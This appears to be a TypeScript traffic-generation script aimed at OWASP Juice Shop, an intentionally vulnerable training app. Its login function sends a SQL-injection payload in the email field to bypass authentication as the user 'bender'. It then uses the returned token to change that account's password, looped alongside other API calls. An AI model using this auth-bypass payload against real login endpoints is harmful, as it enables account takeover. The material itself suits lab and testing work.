import axios from "axios"

const userLogin = async (url: string) => {
  const data = {
    email: "bender@juice-sh.op'--",
    password: "password"
  }
  return await axios.post(`${url}/rest/user/login`, data)
}

const userWhoAmI = async (url: string) => {
  await axios.get(`${url}/rest/user/whoami`)
}

const applicationConfiguration = async (url: string) => {
  await axios.get(`${url}/rest/admin/application-configuration`)
}

const putReviews = async (url: string) => {
  const data = {
    author: "user1@juice.shop",
    message: "some review"
  }
  await axios.put(`${url}/rest/products/1/reviews`, data )
}

const getReviews = async (url: string) => {
  await axios.get(`${url}/rest/products/1/reviews`)
}

const apiUsers = async (url: string, num: number) => {
  const data = {
    email: `test-user${num}@juice.shop`,
    password: "password",
    repeatPassword: "password"
  }
  await axios.post(`${url}/api/Users`, data)
}

const changePassword = async (url: string, authToken: string) => {
  const query = {
    new: "password",
    repeat: "password",
  }
  await axios.get(`${url}/rest/user/change-password`, {
    params: { ...query },
    headers: {
      Authorization: `Bearer ${authToken}`
    }
  })
}

const saveLoginIp = async (url: string, authToken: string) => {
  await axios.get(`${url}/rest/saveLoginIp`,
    {
      headers: {
        Authorization: `Bearer ${authToken}`
      }
    }
  )
}

const main = async () => {
  const url = process.argv[2]
  if (!url) {
    console.error("Please provide url for juice shop server.")
    return
  }
  const authData = (await userLogin(url))?.data
  const jwt = authData?.authentication?.token
  for (let i = 0; i < 100; i++) {
    const promises = [
      userLogin(url),
      userWhoAmI(url),
      applicationConfiguration(url),
      putReviews(url),
      getReviews(url),
      apiUsers(url, i),
      changePassword(url, jwt),
      saveLoginIp(url, jwt)
    ]
    await Promise.all(promises)
  }
}

main().catch(err => {
  console.error(`Error in main block: ${err}`)
})
